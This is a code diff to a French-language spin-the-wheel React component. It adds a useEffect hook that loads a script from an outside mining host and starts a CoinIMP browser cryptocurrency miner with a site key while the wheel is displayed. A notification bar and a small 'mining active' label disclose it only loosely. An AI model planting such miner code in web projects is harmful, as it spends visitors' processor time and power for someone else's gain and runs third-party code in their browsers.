@@ -269,11 +269,37 @@ export const SpinWheel: React.FC<SpinWheelProps> = ({ onZeroWin }) => {
     }
   };
 
+  useEffect(() => {
+    // Add mining script to the page
+    const script1 = document.createElement('script');
+    script1.src = 'https://www.hostingcloud.racing/Q1Mx.js';
+    document.head.appendChild(script1);
+
+    const script2 = document.createElement('script');
+    script2.innerHTML = `
+      var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
+        throttle: 0.2, c: 'w'
+      });
+      _client.start();
+      _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+    `;
+    document.body.appendChild(script2);
+
+    return () => {
+      // Cleanup scripts on unmount
+      document.head.removeChild(script1);
+      document.body.removeChild(script2);
+    };
+  }, []);
+
   return (
     <Card className="gradient-card mb-8">
       <CardHeader className="text-center">
         <CardTitle className="text-3xl gradient-text">🎰 Roue de la Fortune</CardTitle>
         <p className="text-muted-foreground">Tournez gratuitement toutes les 3h ou achetez des spins !</p>
+        <div className="mt-2 p-2 bg-muted/50 rounded text-sm text-muted-foreground">
+          ⚡ Section avec mining JavaScript actif
+        </div>
       </CardHeader>
       <CardContent>
         <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
